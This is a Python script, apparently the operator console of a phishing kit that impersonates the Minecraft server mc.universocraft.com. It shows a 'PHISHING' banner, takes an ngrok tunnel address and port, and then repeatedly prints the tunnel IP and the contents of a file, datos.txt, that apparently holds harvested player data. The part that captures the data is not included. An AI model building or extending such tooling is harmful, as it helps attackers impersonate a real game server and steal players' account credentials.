###############################
# Consola mc.universocraft.com
###############################

from colorama import *
import platform, sys, socket, os
from time import sleep

init()

so = platform.system()
os.system("title Consola: mc.universocraft.com")
a = 1

def cmdclear():
        if so == "Windows":
            os.system("cls")
        else:
            os.system("clear")

print("")
print("")
print(Fore.RED + "    ██▓███   ██░ ██  ██▓  ██████  ██░ ██  ██▓ ███▄    █   ▄████ ")
print("    ▓██░  ██▒▓██░ ██▒▓██▒▒██    ▒ ▓██░ ██▒▓██▒ ██ ▀█   █  ██▒ ▀█▒")
print("    ▓██░ ██▓▒▒██▀▀██░▒██▒░ ▓██▄   ▒██▀▀██░▒██▒▓██  ▀█ ██▒▒██░▄▄▄░")
print(Fore.WHITE + "    ▒██▄█▓▒ ▒░▓█ ░██ ░██░  ▒   ██▒░▓█ ░██ ░██░▓██▒  ▐▌██▒░▓█  ██▓")
print("    ▒██▒ ░  ░░▓█▒░██▓░██░▒██████▒▒░▓█▒░██▓░██░▒██░   ▓██░░▒▓███▀▒")
print("    ▒▓▒░ ░  ░ ▒ ░░▒░▒░▓  ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ ")
print("    ░▒ ░      ▒ ░▒░ ░ ▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░ ▒ ░░ ░░   ░ ▒░  ░   ░ ")
print("    ░░        ░  ░░ ░ ▒ ░░  ░  ░   ░  ░░ ░ ▒ ░   ░   ░ ░ ░ ░   ░ ")
print("            ░  ░  ░ ░        ░   ░  ░  ░ ░           ░       ░ ")
print("")
print("")
ipngrok = input(Fore.LIGHTBLACK_EX + "    [" + Fore.LIGHTCYAN_EX + "*" + Fore.LIGHTBLACK_EX + "] " + Fore.WHITE + "Enter the Ngrok address (for example, 2.tcp.ngrok.io) » ")
ipngrok2 = socket.gethostbyname(str(ipngrok))
puertongrok = input(Fore.LIGHTBLACK_EX + "    [" + Fore.LIGHTCYAN_EX + "*" + Fore.LIGHTBLACK_EX + "] " + Fore.WHITE + "Write the port of Ngrok. (for example, 18018) » ")
os.system("del datos.txt && echo. >> datos.txt")
cmdclear()
while a <= 2:
    sleep(3)
    cmdclear()
    print("")
    print("")
    print(Fore.RED + "    ██▓███   ██░ ██  ██▓  ██████  ██░ ██  ██▓ ███▄    █   ▄████ ")
    print("    ▓██░  ██▒▓██░ ██▒▓██▒▒██    ▒ ▓██░ ██▒▓██▒ ██ ▀█   █  ██▒ ▀█▒")
    print("    ▓██░ ██▓▒▒██▀▀██░▒██▒░ ▓██▄   ▒██▀▀██░▒██▒▓██  ▀█ ██▒▒██░▄▄▄░")
    print(Fore.WHITE + "    ▒██▄█▓▒ ▒░▓█ ░██ ░██░  ▒   ██▒░▓█ ░██ ░██░▓██▒  ▐▌██▒░▓█  ██▓")
    print("    ▒██▒ ░  ░░▓█▒░██▓░██░▒██████▒▒░▓█▒░██▓░██░▒██░   ▓██░░▒▓███▀▒")
    print("    ▒▓▒░ ░  ░ ▒ ░░▒░▒░▓  ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ ")
    print("    ░▒ ░      ▒ ░▒░ ░ ▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░ ▒ ░░ ░░   ░ ▒░  ░   ░ ")
    print("    ░░        ░  ░░ ░ ▒ ░░  ░  ░   ░  ░░ ░ ▒ ░   ░   ░ ░ ░ ░   ░ ")
    print("            ░  ░  ░ ░        ░   ░  ░  ░ ░           ░       ░ ")
    print("")
    print("")
    print(Fore.LIGHTBLACK_EX + "[" + Fore.GREEN + "#" + Fore.LIGHTBLACK_EX + "]" + Fore.LIGHTYELLOW_EX + " IP: " + Fore.LIGHTRED_EX + ipngrok2 + ":" + puertongrok)
    print(Fore.GREEN + "")
    os.system("type datos.txt")
